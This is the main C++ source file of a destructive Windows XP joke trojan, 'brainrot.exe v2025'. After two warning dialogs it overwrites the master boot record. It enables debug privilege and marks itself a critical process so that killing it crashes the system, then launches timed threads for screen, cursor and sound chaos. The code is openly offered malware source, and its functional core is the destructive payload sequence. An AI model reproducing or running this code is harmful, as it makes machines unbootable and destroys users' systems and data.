typedef struct IUnknown IUnknown; //For some reason it doesn't work without this. I hate this stupid Windows v141_xp compiler.

#include "Brainrot2025.h"

using namespace std;

int __stdcall WinMain(HINSTANCE hI, HINSTANCE, LPSTR, int)
{
	LockEveryFile();

	if (IsWindowsVistaOrGreater())
	{
		MessageBoxW(0, L"This trojan can only be run on Windows XP Professional 64-bit edition.", L"Wait you're doing it wro-wait WHAT THE FUCK ARE YOU DOING", MB_ICONHAND | MB_SYSTEMMODAL);
		return 0;
	}

	if (MessageBoxW(0, L"Welcome to brainrot.exe v2025!\n"
		L"This is a remake of brainrot.exe, a Windows XP trojan I made last year to celebrate 100 subscribers.\n\n"
		"WARNING: This program is a trojan which will overwrite the boot sector, thus preventing Windows from booting up.\n"
		"It also produces flashing lights and loud noises. If you're sensitive to those, press NO immediately.\n"
		"Are you sure you want to proceed?", L"This will be the most brain frying experience ever", MB_ICONWARNING | MB_YESNO | MB_DEFBUTTON2 | MB_SYSTEMMODAL) == IDNO)
		return 0;

	if (MessageBoxW(0, L"This is your final warning. Press OK to proceed.\n"
		"Press CANCEL to exit. If you proceed, there's no going back.\n"
		"I hold absolutely no responsibility for your actions.\n\n", L"\"I know what I'm doing!\" - famous last words", MB_ICONWARNING | MB_OKCANCEL | MB_DEFBUTTON2 | MB_SYSTEMMODAL) == IDCANCEL)
		return 0;

	SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
	BombWindows(); //Overwrite MBR

	auto RtlAdjustPrivilege = (void(*)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN))GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");

	BOOLEAN wasEnabled;
	RtlAdjustPrivilege(20, 1, 0, &wasEnabled); //Adjust debug privilege

	auto RtlSetProcessIsCritical = (void(*)(BYTE, BYTE, BYTE))GetProcAddress(LoadLibraryW(L"ntdll"), "RtlSetProcessIsCritical");

	ULONG response;
	RtlSetProcessIsCritical(1, 0, 0); //Set process as critical (BSoD when killed)

	Sleep(3000);
	THREAD(ChangeWallpaper);
	Sleep(3000);
	THREAD(PlayMusic);
	Sleep(3000); //3 seconds into the music
	THREAD(WindowSpam);
	Sleep(3000); //6
	THREAD(MessageSpam);
	Sleep(26000); //32
	THREAD(Iconpochalypse);
	Sleep(5000); //37
	THREAD(MouseSpasms);
	Sleep(5000); //42
	THREAD(MessageSpam);
	Sleep(12000); //54
	THREAD(TooHotInHere);
	Sleep(10000); //1:04
	thitLevel += 1;
	Sleep(11000); //1:15
	THREAD(Iconpochalypse);
	Sleep(10000); //1:25
	THREAD(WindowSpam);
	THREAD(MessageSpam);
	msLevel += 1;
	Sleep(16000); //1:41
	THREAD(ChangeCursor);
	Sleep(8000); //1:49
	THREAD(WindowSpam);
	THREAD(MessageSpam);
	Sleep(8000); //1:57
	THREAD(ColorMess);
	msLevel += 1;
	Sleep(27000); //1:54
	THREAD(Blurb);
	Sleep(20000); //2:14
	THREAD(Rainbowel);
	Sleep(41000); //3:25
	THREAD(ColorMess);
	Sleep(14000); //3:39
	thitLevel += 3;
	THREAD(WindowSpam);
	THREAD(MessageSpam);
	THREAD(ColorMess);
	msLevel += 2;
	Sleep(7000); //3:46
	thitLevel += 7;
	THREAD(ColorMess);
	THREAD(ColorMess);
	THREAD(Rainbowel);
	msLevel += 2;
	Sleep(9000); //3:55
	THREAD(Blurb);
	THREAD(Rainbowel);
	Sleep(9000); //4:04 not found
	thitLevel += 8;
	THREAD(Rainbowel);
	msLevel += 5;
	Sleep(18000); //4:22
	thitLevel += 20;
	thitAnd = true;
	msLevel += 10;
	Sleep(43000); //5:05
	thitLevel += 10;
	Sleep(3000); //5:08
	THREAD(Rainbowel);
	THREAD(Paralysis);

	Sleep(-1); //Wait for "music" to end
}